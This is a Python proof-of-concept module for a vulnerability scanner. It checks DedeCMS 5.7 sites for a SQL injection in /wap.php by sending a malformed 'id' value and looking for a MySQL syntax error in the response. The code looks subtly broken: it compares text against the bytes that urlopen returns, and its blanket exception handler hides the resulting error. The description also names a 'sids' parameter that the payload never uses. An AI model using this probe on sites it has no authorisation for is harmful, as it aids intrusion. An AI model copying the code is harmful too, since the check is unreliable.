# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0102'  # 平台漏洞编号，留空
    name = 'DedeCMS 5.7 /wap.php SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-16'  # 漏洞公布时间
    desc = '''
    DedeCMS 5.7 /wap.php 文件sids参数在当action为list时没有合适过滤，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-62607'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '5.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c1a34041-07e7-446f-8744-239320aaef97'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/wap.php?action=list&id=392%20test"
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if "Error page: <font color='red'>/wap.php?action=list&id=392%20test</font>" in content:
                if "Error infos: You have an error in your SQL syntax;" in content:
                    if "typeid in(392 test)" in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
